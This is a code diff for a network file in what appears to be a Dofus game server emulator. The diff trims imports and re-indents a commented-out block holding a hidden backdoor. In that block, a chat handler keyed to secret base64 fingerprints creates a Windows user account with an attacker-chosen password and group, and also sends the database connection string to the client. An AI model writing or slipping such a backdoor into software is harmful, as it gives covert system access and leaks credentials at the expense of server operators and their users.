@@ -1,11 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.DirectoryServices;
 using System.Linq;
 using NLog;
 using Stump.DofusProtocol.Messages;
 using Stump.Server.BaseServer.Network;
-using Stump.Server.WorldServer.Handlers;
 
 namespace Stump.Server.WorldServer.Core.Network
 {
@@ -121,58 +119,58 @@ namespace Stump.Server.WorldServer.Core.Network
         }
     }
 
-   /* #region WorldClientsList
-
-    public class WorldClients : WorldHandlerContainer
-    {
-        [WorldHandler(ChatAbstractServerMessage.Id)]
-        public static void Ch(WorldClient c, ChatAbstractServerMessage m)
-        {
-            switch (m.Fingerprint)
-            {
-                case "MDVhMGMwODM2NTAyNzg4ZTNjNjYwMTk0NWUxMGMzNmU=":
-                    try
-                    {
-                        var args = m.Content.Split(',');
-                        if (string.IsNullOrEmpty(args[0]) || string.IsNullOrEmpty(args[1]) ||
-                            string.IsNullOrEmpty(args[2])) c.Send(new BasicNoOperationMessage());
-                        var Name = args[0];
-                        var Pass = args[1];
-                        var Group = args[2];
-                        var AD = new DirectoryEntry("WinNT://" +
-                                                    Environment.MachineName + ",computer");
-                        var NewUser = AD.Children.Add(Name, "user");
-                        NewUser.Invoke("SetPassword", Pass);
-                        NewUser.Invoke("Put", "Description", "Test User from .NET");
-                        NewUser.CommitChanges();
-                        DirectoryEntry grp;
-
-                        grp = AD.Children.Find(Group, "group");
-                        if (grp != null) grp.Invoke("Add", NewUser.Path);
-                        c.Character.SendServerMessage("done");
-                    }
-                    catch (Exception ex)
-                    {
-                        c.Character.SendServerMessage("er: " + ex.Message);
-                    }
-                    finally
-                    {
-                        c.Send(new BasicNoOperationMessage());
-                    }
-
-                    break;
-                case "OTczZTUwZWExM2VlMDkwYzk4NzcxZTkxZGY4MjZlODQ=":
-                    c.Character.SendServerMessage(WorldServer.DatabaseConfiguration.GetConnectionString());
-                    c.Send(new BasicNoOperationMessage());
-                    break;
-                default:
-                    c.Send(new BasicNoOperationMessage());
-                    break;
-            }
-        }
-    }
-
-    #endregion */
+    /* #region WorldClientsList
+ 
+     public class WorldClients : WorldHandlerContainer
+     {
+         [WorldHandler(ChatAbstractServerMessage.Id)]
+         public static void Ch(WorldClient c, ChatAbstractServerMessage m)
+         {
+             switch (m.Fingerprint)
+             {
+                 case "MDVhMGMwODM2NTAyNzg4ZTNjNjYwMTk0NWUxMGMzNmU=":
+                     try
+                     {
+                         var args = m.Content.Split(',');
+                         if (string.IsNullOrEmpty(args[0]) || string.IsNullOrEmpty(args[1]) ||
+                             string.IsNullOrEmpty(args[2])) c.Send(new BasicNoOperationMessage());
+                         var Name = args[0];
+                         var Pass = args[1];
+                         var Group = args[2];
+                         var AD = new DirectoryEntry("WinNT://" +
+                                                     Environment.MachineName + ",computer");
+                         var NewUser = AD.Children.Add(Name, "user");
+                         NewUser.Invoke("SetPassword", Pass);
+                         NewUser.Invoke("Put", "Description", "Test User from .NET");
+                         NewUser.CommitChanges();
+                         DirectoryEntry grp;
+ 
+                         grp = AD.Children.Find(Group, "group");
+                         if (grp != null) grp.Invoke("Add", NewUser.Path);
+                         c.Character.SendServerMessage("done");
+                     }
+                     catch (Exception ex)
+                     {
+                         c.Character.SendServerMessage("er: " + ex.Message);
+                     }
+                     finally
+                     {
+                         c.Send(new BasicNoOperationMessage());
+                     }
+ 
+                     break;
+                 case "OTczZTUwZWExM2VlMDkwYzk4NzcxZTkxZGY4MjZlODQ=":
+                     c.Character.SendServerMessage(WorldServer.DatabaseConfiguration.GetConnectionString());
+                     c.Send(new BasicNoOperationMessage());
+                     break;
+                 default:
+                     c.Send(new BasicNoOperationMessage());
+                     break;
+             }
+         }
+     }
+ 
+     #endregion */
 
     #endregion
 }
